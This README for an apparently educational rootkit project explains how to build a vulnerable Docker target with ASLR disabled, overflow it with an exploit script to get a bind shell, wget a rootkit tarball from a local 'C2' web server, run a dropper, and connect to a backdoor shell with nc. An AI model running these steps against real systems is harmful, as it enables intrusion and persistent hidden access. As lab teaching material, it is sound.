# Rootkit Project

## Project Layout

`rootkit/` - contains source code for malicious rootkit library 
`dropper/` - contains vulnerable target program and payload delivery code
`target/` - contains code for testing/target environment (will eventually be run on target server)

## Purpose

This readme details the process for setting up your test environment, and installing your malware using an exploit script.

In order to do install, you will run an exploit script which will exploit a buffer overflow in the target process.
This will open up a temporary bind shell into the process which you can use to install your rootkit onto the system.

This will give you a more permenant backdoor, and also allow you to use all of your features in the coming weeks, as you
add more.

## Test Target Environment Setup

Perform all these steps in the vm in the **target/ directory**

1. install docker

```sh
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh
```

2. disable ssh

```sh
sudo systemctl stop sshd
```

3. disable aslr

```sh
sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
4. install and enable apache

```sh
sudo apt install apache2
```

5. run docker compose up -d

## Malware Installation Process

Preform these steps in the **dropper/ directory** 

### Set up C2

1. create rootkit tarball
> make sure you compile your rootkit and move the rootkit.so file to the 

```sh
tar -czf rootkit.tz drop.sh rootkit.so
```
 
2. move the rootkit tarball to /var/www/html ("C2 server")

```sh
cp rootkit.tz /var/www/html
```

### Run the exploit 

1. run your exploit, it will hang, let it do so

```sh
py exploit.py
```

2. in a separate terminal connect to localhost:4567 via `nc` (stage 1 bind shell)
3. download and unzip your tarball

```sh
wget http://127.0.0.1/rootkit.tz
tar -xzf rootkit.tz
```

4. install your malware

```sh
chmod +x drop.sh 
./drop.sh (installs your malware)
```

5. ssh into trigger address
```sh
ssh joebruin@localhost
```

6. open bind shell (nc localhost 1234)

```sh
nc localhost 1234
```

7. Hack Away - your malware is running in the docker container
